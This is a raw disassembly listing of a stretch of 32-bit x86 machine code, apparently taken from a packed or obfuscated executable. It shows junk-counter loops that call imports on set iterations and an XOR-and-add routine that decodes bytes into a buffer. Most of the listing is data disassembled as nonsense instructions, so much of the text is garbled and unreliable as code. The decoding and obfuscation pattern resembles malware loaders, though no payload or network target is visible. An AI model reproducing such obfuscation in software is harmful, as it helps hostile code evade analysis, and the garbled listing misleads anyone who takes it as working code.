  403905:	xor    eax,ecx
  403907:	mov    esi,0xffcd8d64
  40390c:	sub    esi,eax
  40390e:	add    esi,DWORD PTR [ebp+0x10]
  403911:	cmp    edx,esi
  403913:	jbe    0x4029f8
  403919:	pop    ebx
  40391a:	mov    eax,0xf89c8530
  40391f:	pop    edi
  403920:	pop    esi
  403921:	leave  
  403922:	ret    0xc
  403925:	push   ebp
  403926:	mov    ebp,esp
  403928:	sub    esp,0x58
  40392b:	mov    ecx,DWORD PTR [ebp+0x8]
  40392e:	mov    DWORD PTR ds:0x43442d,0x11
  403938:	cmp    DWORD PTR ds:0x43442d,0x0
  40393f:	je     0x40397b
  403945:	cmp    DWORD PTR ds:0x43442d,0x17
  40394c:	jne    0x403960
  403952:	push   0x43437a
  403957:	push   DWORD PTR [ebp-0x24]
  40395a:	call   DWORD PTR ds:0x432c26
  403960:	mov    eax,ds:0x43442d
  403965:	dec    eax
  403966:	mov    ds:0x43442d,eax
  40396b:	jmp    0x403938
  403970:	mov    eax,ds:0x432dca
  403975:	add    DWORD PTR ds:0x432de2,eax
  40397b:	mov    eax,0x8a3e
  403980:	xor    ax,WORD PTR [ecx+0x20]
  403984:	mov    ecx,0x3b04
  403989:	adc    DWORD PTR ds:0x4326f4,0x34fe
  403993:	add    ax,cx
  403996:	movzx  ecx,BYTE PTR ds:0x43441d
  40399d:	sub    DWORD PTR ds:0x4343a2,ecx
  4039a3:	movzx  eax,ax
  4039a6:	adc    ecx,DWORD PTR ds:0x434429
  4039ac:	mov    DWORD PTR [ebp-0xc],eax
  4039af:	and    ecx,0x4bd2
  4039b5:	mov    BYTE PTR [ebp-0x1],0x7f
  4039b9:	xor    ecx,ecx
  4039bb:	or     ecx,DWORD PTR ds:0x434396
  4039c1:	xor    ecx,DWORD PTR ds:0x43439a
  4039c7:	mov    DWORD PTR ds:0x434396,ecx
  4039cd:	lea    eax,[ebp-0x1]
  4039d0:	mov    DWORD PTR ds:0x432dbe,0x10
  4039da:	cmp    DWORD PTR ds:0x432dbe,0x0
  4039e1:	je     0x403a23
  4039e7:	cmp    DWORD PTR ds:0x432dbe,0x1d
  4039ee:	jne    0x403a11
  4039f4:	push   0x43438a
  4039f9:	push   0x43275d
  4039fe:	push   DWORD PTR [ebp-0xc]
  403a01:	push   0x5939
  403a06:	push   0x4c17
  403a0b:	call   DWORD PTR ds:0x432c2a
  403a11:	mov    ecx,DWORD PTR ds:0x432dbe
  403a17:	dec    ecx
  403a18:	mov    DWORD PTR ds:0x432dbe,ecx
  403a1e:	jmp    0x4039da
  403a23:	mov    DWORD PTR [ebp-0x10],eax
  403a26:	mov    al,BYTE PTR [ebp-0x1]
  403a29:	adc    DWORD PTR ds:0x4326f4,ecx
  403a2f:	mov    ecx,DWORD PTR [ebp-0x10]
  403a32:	xor    al,0x47
  403a34:	sub    al,0x37
  403a36:	and    DWORD PTR ds:0x43437e,0x4d53
  403a40:	mov    BYTE PTR [ecx],al
  403a42:	mov    DWORD PTR ds:0x432dde,0x1b
  403a4c:	cmp    DWORD PTR ds:0x432dde,0x0
  403a53:	je     0x403ab0
  403a59:	cmp    DWORD PTR ds:0x432dde,0xc
  403a60:	jne    0x403a7c
  403a66:	push   0x432de6
  403a6b:	push   DWORD PTR [ebp-0x28]
  403a6e:	push   0x43439e
  403a73:	push   DWORD PTR [ebp-0x28]
  403a76:	call   DWORD PTR ds:0x432c2e
  403a7c:	cmp    DWORD PTR ds:0x432dde,0xd
  403a83:	jne    0x403a98
  403a89:	xor    ecx,ecx
  403a8b:	xor    ecx,DWORD PTR ds:0x432dde
  403a91:	dec    ecx
  403a92:	mov    DWORD PTR ds:0x432dde,ecx
  403a98:	mov    ecx,DWORD PTR ds:0x432dde
  403a9e:	dec    ecx
  403a9f:	mov    DWORD PTR ds:0x432dde,ecx
  403aa5:	jmp    0x403a4c
  403aaa:	and    ecx,0x3444
  403ab0:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403ab7:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403abe:	add    DWORD PTR ds:0x43439a,edi
  403ac4:	mov    eax,DWORD PTR [ebp-0x8]
  403ac7:	or     DWORD PTR ds:0x434396,ecx
  403acd:	mov    ecx,0x7510855
  403ad2:	jmp    0x403c17
  403ad7:	and    eax,0x555995f7
  403adc:	pop    ecx
  403add:	icebp  
  403ade:	jae    0x403a7c
  403ae0:	lods   eax,DWORD PTR ds:[esi]
  403ae1:	imul   ebp,DWORD PTR [ebx],0x6e
  403ae4:	xor    ah,bh
  403ae6:	mov    esp,gs
  403ae8:	push   ds
  403ae9:	jo     0x403b5b
  403aeb:	sbb    BYTE PTR [edi+0x70],bh
  403aee:	jo     0x403b1c
  403af0:	pushf  
  403af1:	mov    al,bl
  403af3:	aad    0x55
  403af5:	xchg   ebp,eax
  403af6:	pop    ds
  403af7:	push   ds
  403af8:	daa    
  403af9:	(bad)  
  403afa:	push   eax
  403afb:	jo     0x403b5d
  403afd:	or     ah,0x86
  403b00:	daa    
  403b01:	add    eax,0x71bfc48c
  403b06:	sub    dh,bh
  403b08:	jle    0x403b4d
  403b0a:	ret    
  403b0b:	je     0x403aa3
  403b0d:	clc    
  403b0e:	ja     0x403b5a
  403b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b11:	push   ebx
  403b12:	jb     0x403a9b
  403b14:	push   ecx
  403b15:	mov    ah,0xe6
  403b17:	inc    edx
  403b18:	xor    BYTE PTR [esi],dh
  403b1a:	inc    DWORD PTR [edi+0x31192a68]
  403b20:	jp     0x403b63
  403b22:	adc    DWORD PTR [esi],ebx
  403b24:	daa    
  403b25:	push   eax
  403b26:	stos   DWORD PTR es:[edi],eax
  403b27:	xchg   ebx,eax
  403b28:	xchg   ebx,eax
  403b29:	sets   bh
  403b2c:	pop    esp
  403b2d:	in     al,dx
  403b2e:	dec    eax
  403b2f:	imul   edi,esi,0x2499ef0d
  403b35:	xor    BYTE PTR [ecx-0x3ad3c228],ch
  403b3b:	loope  0x403b17
  403b3d:	aaa    
  403b3e:	inc    ebp
  403b3f:	xor    al,0x51
  403b41:	sbb    DWORD PTR [ecx*1+0x150d61a8],ebx
  403b48:	or     DWORD PTR [esi+0x5],ebp
  403b4b:	adc    al,0xfe
  403b4d:	es pop eax
  403b4f:	mov    edi,0xaa053947
  403b54:	popa   
  403b55:	push   0x52
  403b57:	and    al,0xad
  403b59:	nop
  403b5a:	xchg   ebx,eax
  403b5b:	sar    edx,1
  403b5d:	popa   
  403b5e:	xchg   ebp,eax
  403b5f:	or     bh,ah
  403b61:	shl    ecx,1
  403b63:	(bad)  
  403b64:	push   ds
  403b65:	nop
  403b66:	pop    ss
  403b67:	hlt    
  403b68:	js     0x403b0f
  403b6a:	mov    ah,0x49
  403b6c:	xchg   edx,eax
  403b6d:	push   ecx
  403b6e:	xlat   BYTE PTR ds:[ebx]
  403b6f:	or     ecx,DWORD PTR [ecx]
  403b71:	push   ss
  403b72:	loop   0x403b83
  403b74:	inc    edi
  403b75:	ins    DWORD PTR es:[edi],dx
  403b76:	mov    edi,0xa1ed7929
  403b7b:	xchg   esp,eax
  403b7c:	jbe    0x403b28
  403b7e:	popa   
  403b7f:	sahf   
  403b80:	add    eax,0xb43db536
  403b85:	ja     0x403b6d
  403b87:	in     al,dx
  403b88:	jle    0x403bee
  403b8a:	or     bl,cl
  403b8c:	pop    ss
  403b8d:	dec    ebp
  403b8e:	(bad)  
  403b8f:	mov    eax,ds:0xddecae08
  403b94:	popf   
  403b95:	aam    0x86
  403b97:	or     BYTE PTR [ebx-0x64],dl
  403b9a:	rcr    DWORD PTR [ecx+0x239cb262],0xee
  403ba1:	and    dh,bl
  403ba3:	jl     0x403b93
  403ba5:	pop    ecx
  403ba6:	lahf   
  403ba7:	dec    ebx
  403ba8:	leave  
  403ba9:	ds dec edi
  403bab:	fnstenv [ebx+0x2b]
  403bae:	cdq    
  403baf:	int    0x4c
  403bb1:	cmp    eax,0xb7dc7256
  403bb6:	fwait
  403bb7:	pop    esp
  403bb8:	ja     0x403b3a
  403bba:	xchg   ebp,eax
  403bbb:	imul   BYTE PTR [edi+0x60]
  403bbe:	pusha  
  403bbf:	xor    ch,BYTE PTR [edi]
  403bc1:	mov    eax,ds:0x489b95b8
  403bc6:	push   edx
  403bc7:	out    dx,eax
  403bc8:	outs   dx,DWORD PTR ds:[esi]
  403bc9:	push   eax
  403bca:	mov    DWORD PTR [edi-0x5b342d9a],ebp
  403bd0:	xlat   BYTE PTR ds:[ebx]
  403bd1:	or     eax,0x41603fa
  403bd6:	ror    dl,0x49
  403bd9:	or     ecx,DWORD PTR [esi+0x38]
  403bdc:	sar    BYTE PTR [ecx],0x57
  403bdf:	push   ebx
  403be0:	mov    ebx,0x630a6694
  403be5:	in     al,0x7d
  403be7:	mov    edi,DWORD PTR [ebp-0x6f254d4b]
  403bed:	add    dl,BYTE PTR [esi-0x74864730]
  403bf3:	jb     0x403c6c
  403bf5:	sub    al,BYTE PTR [ecx+0x7871408a]
  403bfb:	cmc    
  403bfc:	add    DWORD PTR [eax-0x64],esi
  403bff:	arpl   WORD PTR [ebx+edi*1+0x5054af33],bx
  403c06:	push   ecx
  403c07:	es mov ecx,0x54d53f6b
  403c0d:	and    ch,dh
  403c0f:	sbb    DWORD PTR [ebx+0x5a],eax
  403c12:	imul   ecx,DWORD PTR [edi+0x56cf1023],0xbec13346
  403c1c:	pushf  
  403c1d:	jb     0x403c51
  403c1f:	add    BYTE PTR [ecx+0x4343761d],al
  403c25:	add    BYTE PTR [ecx],ah
  403c27:	inc    esp
  403c28:	inc    ebx
  403c29:	add    BYTE PTR [ebx],al
  403c2b:	mov    bh,0x5
  403c2e:	(bad)  
  403c2f:	sub    eax,0x19db0043
  403c34:	add    BYTE PTR [eax],al
  403c36:	jmp    0x403c4d
  403c3b:	mov    DWORD PTR ds:0x43436a,0x1bda
  403c45:	mov    dl,BYTE PTR [ebp-0x1]
  403c48:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403c4c:	inc    eax
  403c4d:	cmp    eax,0x40
  403c50:	jmp    0x403d95
  403c55:	sbb    bl,BYTE PTR [ebx+eiz*1+0x1981a102]
  403c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c5d:	scas   al,BYTE PTR es:[edi]
  403c5e:	xchg   ecx,eax
  403c5f:	sub    al,0x28
  403c61:	and    al,BYTE PTR [edx]
  403c63:	cs (bad) 
  403c65:	xchg   esp,eax
  403c66:	sbb    eax,0x7f187070
  403c6b:	jo     0x403cdd
  403c6d:	popf   
  403c6e:	fbstp  TBYTE PTR [ebx-0x4d]
  403c71:	std    
  403c72:	aam    0xa9
  403c74:	dec    esi
  403c75:	mov    eax,ds:0x763fc796
  403c7a:	push   ecx
  403c7b:	aam    0xb1
  403c7d:	(bad)  
  403c7e:	push   ecx
  403c7f:	jb     0x403c76
  403c81:	and    edi,DWORD PTR [esp+edx*8-0x1e]
  403c85:	jl     0x403cb8
  403c87:	cmp    esp,ebp
  403c89:	repnz sub eax,0x9f6aa9d0
  403c8f:	cmp    esi,DWORD PTR [ebx+0x19]
  403c92:	ins    DWORD PTR es:[edi],dx
  403c93:	mov    DWORD PTR [esi+edx*8+0x45],ecx
  403c97:	(bad)  
  403c98:	cmc    
  403c99:	(bad)  
  403c9a:	std    
  403c9b:	sbb    ebp,0xbd455b9b
  403ca1:	sbb    BYTE PTR [ecx-0x1d],al
  403ca4:	in     al,dx
  403ca5:	ins    BYTE PTR es:[edi],dx
  403ca6:	ins    BYTE PTR es:[edi],dx
  403ca7:	xor    cl,ah
  403ca9:	adc    eax,0xd3999015
  403cae:	push   ebp
  403caf:	sbb    al,0x81
  403cb1:	dec    eax
  403cb2:	add    BYTE PTR [esp+esi*4],bl
  403cb5:	pop    ss
  403cb6:	lock les ebp,FWORD PTR [ebx-0x7210997b]
  403cbd:	mov    dl,0xe1
  403cbf:	xchg   ecx,eax
  403cc0:	popf   
  403cc1:	jno    0x403d42
  403cc3:	mov    eax,ds:0x21041a23
  403cc8:	imul   ebp,DWORD PTR ds:0xf1ba0124,0x1b83ca3f
  403cd2:	and    al,0x40
  403cd4:	leave  
  403cd5:	mov    ecx,DWORD PTR [eax+0x4035f8a0]
  403cdb:	jae    0x403cdc
  403cdd:	in     eax,0xdc
  403cdf:	sbb    ch,bl
  403ce1:	inc    esi
  403ce2:	cli    
  403ce3:	jle    0x403c90
  403ce5:	adc    BYTE PTR [edx],al
  403ce7:	cmp    ebp,edx
  403ce9:	pop    esi
  403cea:	test   eax,0x207d475b
  403cef:	mov    esi,0x57f2e356
  403cf4:	sti    
  403cf5:	and    BYTE PTR [esi],cl
  403cf7:	stos   DWORD PTR es:[edi],eax
  403cf8:	lods   eax,DWORD PTR ds:[esi]
  403cf9:	cmp    eax,0x727cb441
  403cfe:	pop    ss
  403cff:	mov    bh,0x89
  403d01:	adc    DWORD PTR [edi],ebx
  403d03:	xchg   esp,eax
  403d04:	es inc ecx
  403d06:	mov    esi,edx
  403d08:	jle    0x403cf4
  403d0a:	fucomip st,st(2)
  403d0d:	rcr    BYTE PTR [edi+eiz*4+0x38],0x1a
  403d12:	jb     0x403d4c
  403d14:	add    ebp,DWORD PTR [edx-0x46ab76ec]
  403d1a:	lods   al,BYTE PTR ds:[esi]
  403d1b:	out    0x7b,al
  403d1d:	sub    al,0x4a
  403d1f:	rcl    ebp,1
  403d21:	test   eax,0x3995ce9a
  403d26:	mov    ch,BYTE PTR [ecx]
  403d28:	sub    BYTE PTR [ebp-0x63c99e1f],cl
  403d2e:	or     eax,0x6d060127
  403d33:	loop   0x403cd8
  403d35:	fs jle 0x403cb9
  403d38:	inc    edi
  403d39:	nop
  403d3a:	add    ecx,DWORD PTR [edx+0x22]
  403d3d:	adc    al,0x67
  403d3f:	mov    ds:0x7ba29ec6,eax
  403d44:	dec    ecx
  403d45:	jbe    0x403dae
  403d47:	mov    esp,0x971eaa5c
  403d4c:	sub    esi,eax
  403d4e:	xor    al,dh
  403d50:	and    ebp,DWORD PTR [ecx+0x2b]
  403d53:	jo     0x403dce
  403d55:	mul    BYTE PTR [ebx-0x1e]
  403d58:	xlat   BYTE PTR ds:[ebx]
  403d59:	fist   WORD PTR [ecx+0x21389b75]
  403d5f:	int3   
  403d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d61:	outs   dx,DWORD PTR ds:[esi]
  403d62:	or     eax,0x5f1ead52
  403d67:	jne    0x403d38
  403d69:	jno    0x403d59
  403d6b:	mov    dl,0x67
  403d6d:	or     ah,cl
  403d6f:	xlat   BYTE PTR ds:[ebx]
  403d70:	mov    ebp,DWORD PTR [eax]
  403d72:	adc    eax,0x7da83864
  403d77:	add    esi,DWORD PTR [edi]
  403d79:	push   0x6bdbc0da
  403d7e:	jb     0x403dd6
  403d80:	pop    ds
  403d81:	cld    
  403d82:	push   ebx
  403d83:	xor    eax,DWORD PTR [ebx-0x7990c20c]
  403d89:	or     al,0x3b
  403d8b:	dec    ebx
  403d8c:	cli    
  403d8d:	and    bh,BYTE PTR [eax+0x39375a0d]
  403d93:	and    cl,ch
  403d95:	jb     0x403c3b
  403d9b:	mov    edx,DWORD PTR [ebp-0x8]
  403d9e:	and    DWORD PTR ds:0x43439a,0x0
  403da8:	jmp    0x403dbb
  403dad:	xor    eax,eax
  403daf:	add    eax,DWORD PTR ds:0x43439a
  403db5:	inc    eax
  403db6:	mov    ds:0x43439a,eax
  403dbb:	cmp    DWORD PTR ds:0x43439a,0x13
  403dc2:	jae    0x403dfe
  403dc8:	cmp    DWORD PTR ds:0x43439a,0xc
  403dcf:	jne    0x403dde
  403dd5:	push   DWORD PTR [ebp-0x1c]
  403dd8:	call   DWORD PTR ds:0x4329be
  403dde:	cmp    DWORD PTR ds:0x43439a,0xb
  403de5:	jne    0x403df9
  403deb:	xor    eax,eax
  403ded:	add    eax,DWORD PTR ds:0x43439a
  403df3:	inc    eax
  403df4:	mov    ds:0x43439a,eax
  403df9:	jmp    0x403dad
  403dfe:	mov    eax,DWORD PTR [ebp-0xc]
  403e01:	xor    edx,ecx
  403e03:	add    edx,esi
  403e05:	cmp    edx,eax
  403e07:	jmp    0x403f4c
  403e0c:	inc    ecx
  403e0d:	sub    al,0xb8
  403e0f:	xor    BYTE PTR [ebp+0x72],0x41
  403e13:	jmp    0x403d9a
  403e15:	inc    ebp
  403e16:	mov    al,0x72
  403e18:	xor    eax,0xbce9c393
  403e1d:	sbb    al,0x70
  403e1f:	jo     0x403e39
  403e21:	jg     0x403e93
  403e23:	jo     0x403e16
  403e25:	popf   
  403e26:	add    eax,0x74b6d8a0
  403e2b:	push   esp
  403e2c:	sub    DWORD PTR [esi],0x62
  403e2f:	sub    eax,0xc36dff5f
  403e34:	outs   dx,BYTE PTR ds:[esi]
  403e35:	inc    esi
  403e36:	jnp    0x403e8b
  403e38:	sub    eax,0x6c224ba0
  403e3d:	lea    esp,gs:[ebp+0x2e]
  403e41:	in     al,0xd9
  403e43:	mov    ebp,0xb2f95c64
  403e48:	xor    eax,DWORD PTR [ebp+0x1c]
  403e4b:	jae    0x403e77
  403e4d:	int    0x62
  403e4f:	sbb    al,0x14
  403e51:	xchg   edi,eax
  403e52:	jmp    0xc25f8a43
  403e57:	inc    eax
  403e58:	mov    cl,0x27
  403e5b:	js     0x403e63
  403e5d:	jmp    0x403e47
  403e5f:	pushf  
  403e60:	shr    BYTE PTR [esp+edi*1],0x19
  403e64:	push   0xffffffa7
  403e66:	cmp    al,0xd4
  403e68:	mov    ch,0x4f
  403e6a:	mov    ds:0xf9713756,eax
  403e6f:	inc    edx
  403e70:	and    BYTE PTR [ecx+0x67],dh
  403e73:	push   edx
  403e74:	pop    ecx
  403e75:	jbe    0x403eeb
  403e77:	call   0x60bf6f1
  403e7c:	mov    eax,0x5a3009b1
  403e81:	xchg   esp,eax
  403e82:	xor    al,0xde
  403e84:	in     al,dx
  403e85:	pop    edx
  403e86:	or     BYTE PTR ds:0x7afcbe59,0x21
  403e8d:	lods   eax,DWORD PTR ds:[esi]
  403e8e:	sbb    bl,BYTE PTR [edi+0x2c]
  403e91:	sub    bl,BYTE PTR ds:0x1f16830a
  403e97:	shr    BYTE PTR [ebx],0x29
  403e9a:	or     al,0xb7
  403e9c:	scas   al,BYTE PTR es:[edi]
  403e9d:	lahf   
  403e9e:	dec    esi
  403e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ea0:	sbb    eax,0x76d4c599
  403ea5:	es mov bh,0x93
  403ea8:	mov    al,BYTE PTR [ecx+0x766c8818]
  403eae:	push   ebx
  403eaf:	fwait
  403eb0:	call   0x751935f6
  403eb5:	syscall 
  403eb7:	lods   al,BYTE PTR ds:[esi]
  403eb8:	hlt    
  403eb9:	xor    DWORD PTR [ebx+ebx*1],0xffffffa0
  403ebd:	pushf  
  403ebe:	jecxz  0x403eda
  403ec0:	(bad)  
  403ec1:	jo     0x403f1f
  403ec3:	pop    esi
  403ec4:	jbe    0x403e50
  403ec6:	pusha  
  403ec7:	adc    ebp,ecx
  403ec9:	imul   edx,DWORD PTR [edx+0x17],0x77
  403ecd:	xor    eax,0xc8c45945
  403ed2:	pop    ebx
  403ed3:	push   eax
  403ed4:	mov    edx,0xa473245e
  403ed9:	jbe    0x403eb8
  403edb:	pop    ecx
  403edc:	fisubr WORD PTR [edx+0x13]
  403edf:	scas   al,BYTE PTR es:[edi]
  403ee0:	(bad)
  403ee4:	inc    ecx
  403ee5:	sub    DWORD PTR [eax-0xb],edi
  403ee8:	sbb    ebx,edx
  403eea:	dec    edi
  403eeb:	(bad)  [edi-0x7cc04e12]
  403ef1:	cli    
  403ef2:	sub    esp,DWORD PTR [ebp-0x53d05f63]
  403ef8:	sbb    BYTE PTR [ecx+0x30],cl
  403efb:	popa   
  403efc:	jne    0x403f78
  403efe:	or     ebp,DWORD PTR ds:[eax-0x3a]
  403f02:	mov    eax,0xfb471fb5
  403f07:	inc    eax
  403f08:	mov    DWORD PTR [esi+0x5a0b99e4],edi
  403f0e:	div    BYTE PTR [ebp+0x6d]
  403f11:	mov    esp,0xe1e34929
  403f16:	pop    ds
  403f17:	rcl    BYTE PTR [edi*1-0x29837f55],cl
  403f1e:	jns    0x403f08
  403f20:	inc    ebp
  403f21:	jbe    0x403fa0
  403f23:	fmul   QWORD PTR [ebx+0x4c]
  403f26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f27:	loopne 0x403ed0
  403f29:	mov    edx,0x8a8120e6
  403f2e:	push   ss
  403f2f:	pop    ebp
  403f30:	cmp    dl,BYTE PTR [eax+0x1c9ebec9]
  403f36:	enter  0x8d78,0x25
  403f3a:	daa    
  403f3b:	jle    0x403ee3
  403f3d:	adc    al,0x22
  403f3f:	(bad)  
  403f40:	dec    esp
  403f41:	in     eax,0x44
  403f43:	or     DWORD PTR [edi],esi
  403f45:	shl    ch,1
  403f47:	xor    eax,0xe5214382
  403f4c:	je     0x4040d7
  403f52:	push   ebx
  403f53:	push   edi
  403f54:	mov    edi,DWORD PTR [ebp+0x8]
  403f57:	mov    eax,0x8a3e
  403f5c:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403f61:	mov    edi,0x3b04
  403f66:	add    ax,di
  403f69:	movzx  eax,ax
  403f6c:	mov    DWORD PTR [ebp-0x14],eax
  403f6f:	mov    eax,DWORD PTR [ebp+0x8]
  403f72:	movzx  eax,WORD PTR [eax+edx*4]
  403f76:	xor    eax,0x8a3e
  403f7b:	add    eax,edi
  403f7d:	mov    edi,DWORD PTR [ebp-0x14]
  403f80:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403f84:	mov    eax,DWORD PTR [ebp-0xc]
  403f87:	inc    edx
  403f88:	cmp    edx,eax
  403f8a:	jne    0x403f54
  403f90:	pop    edi
  403f91:	jmp    0x4040d6
  403f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f97:	fisubr DWORD PTR [edi-0x598e8c4b]
  403f9d:	jmp    0x4923f392
  403fa2:	loop   0x403f7e
  403fa4:	jo     0x403fe2
  403fa6:	sbb    esi,DWORD PTR fs:[eax+0x70]
  403faa:	sbb    BYTE PTR [edi+0x70],bh
  403fad:	jo     0x404027
  403faf:	and    cl,BYTE PTR [edx-0x51]
  403fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fb3:	or     al,0xf8
  403fb5:	sar    DWORD PTR [edi],cl
  403fb7:	xlat   BYTE PTR ds:[ebx]
  403fb8:	jmp    0x317d633e
  403fbd:	mov    bl,0xa1
  403fbf:	fstp   QWORD PTR [edi-0x6]
  403fc2:	invd   
  403fc4:	mov    dh,0x16
  403fc6:	and    al,0xb3
  403fc8:	add    al,0xff
  403fca:	aas    
  403fcb:	out    dx,eax
  403fcc:	xchg   ebp,eax
  403fcd:	pop    ds
  403fce:	call   0x209b729c
  403fd3:	cs ret 0x8996
  403fd7:	hlt    
  403fd8:	dec    ebp
  403fd9:	mov    dh,0x6
  403fdb:	and    al,BYTE PTR [ebx+0x2a78d86]
  403fe1:	mov    bh,0xcf
  403fe3:	mov    gs,WORD PTR [eax-0x15]
  403fe6:	pop    edi
  403fe7:	inc    ebp
  403fe8:	mov    al,ds:0x499ff9d0
  403fed:	push   0xf9f6d231
  403ff2:	or     eax,0x4581983a
  403ff7:	xchg   edi,eax
  403ff8:	aad    0xc8
  403ffa:	data16 adc dh,BYTE PTR ds:[ecx+eax*4]
  403fff:	sbb    eax,0x24e95d45
  404004:	pop    edx
  404005:	les    edx,FWORD PTR [ecx+0x2f67eec]
  40400b:	(bad)  
  40400c:	and    eax,0x9a671769
  404011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404012:	ins    DWORD PTR es:[edi],dx
  404013:	xchg   esi,eax
  404014:	mov    eax,ds:0x4a73181a
  404019:	ret    0xcd67
  40401c:	sub    eax,0x62f754aa
  404021:	es or  al,0x44
  404024:	(bad)
  404028:	adc    dl,ah
  40402a:	sbb    BYTE PTR [eax+esi*8+0x44],dl
  40402e:	adc    DWORD PTR [ebx],esi
  404030:	mov    cs,esi
  404032:	pop    esp
  404033:	xor    eax,0xd6bd715b
  404038:	cmp    BYTE PTR [esi-0x7e],0x4c
  40403c:	add    al,0xe
  40403e:	push   esp
  40403f:	inc    esi
  404040:	(bad)  
  404041:	lds    eax,FWORD PTR [ebp+0xbdfb317]
  404047:	dec    esi
  404048:	or     BYTE PTR [edi],al
  40404a:	mov    bl,0x9d
  40404c:	hlt    
  40404d:	test   BYTE PTR [eax-0x2ebd1c3],bh
  404053:	mov    eax,0x378e9d73
  404058:	in     al,dx
  404059:	(bad)
  40405d:	or     al,0x79
  40405f:	call   0x163edee6
  404064:	dec    eax
  404065:	inc    ebp
  404066:	push   ss
  404067:	das    
  404068:	xchg   esp,eax
  404069:	gs mov bl,0xf9
  40406c:	adc    al,0x4f
  40406f:	dec    esp
  404070:	leave  
  404071:	mov    cl,0x4b
  404073:	nop
  404074:	in     al,0x2b
  404076:	sar    esi,1
  404078:	ins    BYTE PTR es:[edi],dx
  404079:	daa    
  40407a:	push   0x78eff6d2
  40407f:	push   ebx
  404080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404081:	pop    es
  404082:	add    eax,0xa3edc643
  404087:	in     eax,0x20
  404089:	test   DWORD PTR [edx],ebp
  40408b:	dec    eax
  40408c:	out    0x46,eax
  40408e:	mov    dh,0x3e
  404090:	xor    eax,0x39667fc
  404095:	test   ebx,edx
  404097:	and    edi,esi
  404099:	aas    
  40409a:	(bad)  
  40409b:	ror    DWORD PTR [ebx-0x57e70f4],cl
  4040a1:	mov    cl,0x56
  4040a3:	or     al,0x90
  4040a5:	pop    ecx
  4040a6:	inc    ebx
  4040a7:	dec    edi
  4040a8:	and    bl,ch
  4040aa:	fmul   QWORD PTR [esi]
  4040ac:	mov    dl,0xf3
  4040ae:	fnstsw WORD PTR [ecx]
  4040b0:	in     al,0x64
  4040b2:	(bad)  
  4040b4:	inc    ecx
  4040b5:	mul    DWORD PTR [edi-0x5e]
  4040b8:	inc    ebp
  4040b9:	and    ch,0x5d
  4040bc:	stc    
  4040bd:	xchg   esi,eax
  4040be:	adc    eax,0x3b73a68a
  4040c3:	or     bl,BYTE PTR [ebp+eax*4+0x12]
  4040c7:	mov    ds:0x4a26a1ac,eax
  4040cc:	xor    al,0xfd
  4040ce:	jbe    0x4040e2
  4040d0:	push   esp
  4040d1:	retf   0x4df9
  4040d4:	inc    edi
  4040d5:	(bad)  
  4040d6:	pop    ebx
  4040d7:	mov    eax,DWORD PTR [ebp-0x8]
  4040da:	mov    edx,DWORD PTR [ebp+0x10]
  4040dd:	jmp    0x404222
  4040e2:	aaa    
  4040e3:	ins    DWORD PTR es:[edi],dx
  4040e4:	pop    ss
  4040e5:	int3   
  4040e6:	push   ebp
  4040e7:	jb     0x4040dc
  4040e9:	jno    0x404096
  4040eb:	pop    ebx
  4040ec:	imul   edi,DWORD PTR [edx+0x7b3736fd],0xc
  4040f3:	sbb    DWORD PTR [eax+0x70],esi
  4040f6:	sbb    BYTE PTR [edi+0x70],bh
  4040f9:	jo     0x4040bb
  4040fb:	data16 repz test al,0x3b
  4040ff:	addr16 xchg edi,eax
  404101:	mov    ?,WORD PTR [ecx]
  404103:	popf   
  404104:	enter  0x1c78,0x8f
  404108:	xor    al,0xd0
  40410a:	push   ebx
  40410b:	lea    ebx,[eax-0x3497f113]
  404111:	push   es
  404112:	popf   
  404113:	mov    cs,WORD PTR ds:0xb5d8556b
  404119:	loop   0x4040c1
  40411b:	or     ah,BYTE PTR [edx]
  40411d:	sbb    ah,bh
  40411f:	xchg   ecx,eax
  404120:	in     al,0x82
  404122:	jle    0x40414c
  404124:	or     DWORD PTR [esi-0x46],esp
  404127:	inc    edi
  404128:	lds    esi,FWORD PTR ds:0xc5a023cd
  40412e:	pop    edi
  40412f:	das    
  404130:	jmp    0x32278c28
  404135:	ret    
  404136:	jmp    0x4207:0x5e37df96
  40413d:	jge    0x40410f
  40413f:	iret   
  404140:	fimul  DWORD PTR [edx]
  404142:	outs   dx,DWORD PTR ds:[esi]
  404143:	sub    eax,0x405c881b
  404148:	push   ebx
  404149:	(bad)  
  40414a:	std    
  40414b:	adc    eax,0x9ad0ac5a
  404150:	test   eax,0x2ffd13ff
  404155:	cs sti 
  404157:	xor    BYTE PTR [eax-0x4be75fee],ch
  40415d:	cwde   
  40415e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40415f:	and    eax,0xb245390b
  404164:	jmp    0x404187
  404166:	or     al,0x85
  404168:	jg     0x4041a9
  40416a:	push   es
  40416b:	popa   
  40416c:	call   0x4821:0x5c756e2c
  404173:	and    ebp,eax
  404175:	xchg   edi,eax
  404176:	(bad)  
  404178:	or     bl,bl
  40417a:	test   BYTE PTR [edx-0x6bb86ff5],ch
  404180:	pusha  
  404181:	sar    BYTE PTR ds:0xdeb25886,1
  404187:	scas   al,BYTE PTR es:[edi]
  404188:	and    esp,0xb4dfdce1
  40418e:	jbe    0x40418e
  404190:	stos   DWORD PTR es:[edi],eax
  404191:	add    al,0x4f
  404193:	mov    ch,al
  404195:	rcl    BYTE PTR [ebp+0x64b8fde],1
  40419b:	and    al,0xa4
  40419d:	fwait
  40419e:	aas    
  40419f:	mov    cl,0x53
  4041a1:	(bad)  
  4041a2:	fdivrp st(5),st
  4041a4:	jp     0x40416c
  4041a6:	mov    esp,0x6ad7cb5e
  4041ab:	fistp  DWORD PTR [esi-0x72]
  4041ae:	jmp    0x404226
  4041b0:	fnstenv [edx-0x376cd954]
  4041b6:	cwde   
  4041b7:	out    dx,al
  4041b8:	sub    al,0x29
